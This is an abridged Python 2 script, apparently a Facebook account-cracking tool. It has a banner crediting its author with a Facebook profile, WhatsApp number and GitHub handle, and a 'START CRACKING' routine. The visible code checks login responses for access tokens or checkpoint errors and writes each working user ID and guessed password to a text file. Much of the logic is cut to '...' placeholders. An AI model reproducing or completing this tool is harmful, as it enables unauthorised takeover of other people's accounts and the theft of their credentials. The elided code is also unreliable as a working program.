...
#!/usr/bin/python2
#coding=utf-8
#originally written (RANA-RAJPOOT)
try:
...
logo = """
     \033[1;92m ___________                  
     \033[1;93m \__    ___/___     ___________ 
     \033[1;92m      |    |    /  _ \ /  _      \_  __ \
     \033[1;93m      |    |   (  <_> |  <_> )      | \/ 
     \033[1;92m.    |____|  \____/ \____/ |__|   
     \033[1;92m╚═══╝──╚╝──╚═══╝╚═══╝╚════╝╚╝─╚╝╚═══╝╚╝─╚╝
\033[1;93m----------------------------------------------------------------------------------------------------------
 \033[1;93m(*)\033[1;92m Author: https://www.facebook.com/NaZerkhaN521
 \033[1;93m(*)\033[1;92m WhatsApp :   +923025669420
 \033[1;93m(*)\033[1;92m Github   : Gustah5
\033[1;93m----------------------------------------------------------------------------------------------------------
"""
def tool():
	os.system("clear")
...
def crack_select():
	...
	if select =="1":
		...
		try:
			...
			print(logo)
			print('')
			print("  🔥 ToOr AjMaLo🔥 START CRACKING.....")
			print('')
											...
											if "access_token" in q:
												...
												if "www.facebook.com" in q["error_msg"]:
													...
													if "access_token" in q:
														...
														if "www.facebook.com" in q["error_msg"]:
															print(" \033[1;28m [ToOr-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("ToOr cp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
